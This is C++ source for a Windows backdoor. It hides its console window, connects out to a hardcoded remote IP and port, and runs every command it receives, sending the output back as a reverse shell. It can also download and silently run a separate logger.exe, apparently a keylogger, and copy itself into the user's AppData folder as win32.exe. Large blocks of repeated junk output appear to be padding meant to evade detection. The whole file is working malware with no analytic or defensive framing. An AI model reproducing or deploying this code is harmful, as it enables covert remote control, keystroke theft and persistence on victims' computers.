#include <iostream>
#include <WinSock2.h>
#include <fstream>
#include <windows.h>
#include <WinUser.h>
#include <sys/locking.h>
#include <sys/stat.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <direct.h>
#pragma comment(lib, "Ws2_32.lib")

#define PORT 10986
#define IP "18.158.58.205"
using namespace std;

void start() {
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 0), &wsaData);
}

void hide_term() {
	HWND window = GetConsoleWindow();
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";

	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	ShowWindow(window, 0);
}

void logger() {
	system("powershell.exe -c \"curl 'http://192.168.0.44:8000/logger.exe' -o logger.exe\"");
	FILE* cmd = _popen("start /b logger.exe", "w");
	fclose(cmd);
}

void perma() {
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";

	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	system("move Project1.exe C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\win32.exe");
}

void trash() {
	int a;
	int b;
	int c;
	int avvdsfsdfsdf;
	int lol[100] = { 0 };
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";

	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
	cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
}

int main() {
	hide_term();
	start();
	int sock;
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		struct sockaddr_in server;
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = inet_addr(IP);
		server.sin_port = htons(PORT);
		if (connect(sock, (const struct sockaddr*)&server,sizeof(server)) != -1) {
			char cont[4096];
			char data[1024];
			char temp[1024];
			while (1) {
				memset(data, 0, sizeof(data));
				memset(cont, 0, sizeof(cont));
				memset(temp, 0, sizeof(temp));
				recv(sock, data, sizeof(data), 0);
				if (strncmp(data, "cd ", 3) == 0) { 
					int z = 0;
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";

					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					for (int i = 3; i < strlen(data)-1; i++) {
						if (data[i] != '\x00')
						{
							temp[z] = data[i];
							z++;
						}
					}
					_chdir(temp);
					send(sock, data, sizeof(data), 0);
				}
				else if (strncmp(data, "logme", 5) == 0) {
					strcpy(data, "[Logging started]");
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";

					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
                    logger();
					send(sock, data, sizeof(data), 0);
				}
				else if (strncmp(data, "moveme", 6) == 0) {
					strcpy(data, "[Program is stored]");
					perma();
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";

					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					cout << "testsadasdasdasdasdasdasdasdasdasdasdasdas";
					send(sock, data, sizeof(data), 0);
				}
				else {
					FILE* cmd = _popen(data, "r");
					while (fgets(data, sizeof(data), cmd) != NULL) {
						strcat(cont, data);
					}
					send(sock, cont, sizeof(cont), 0);
				}
			}

		}
	}
	WSACleanup();
	closesocket(sock);
	return 0;
}

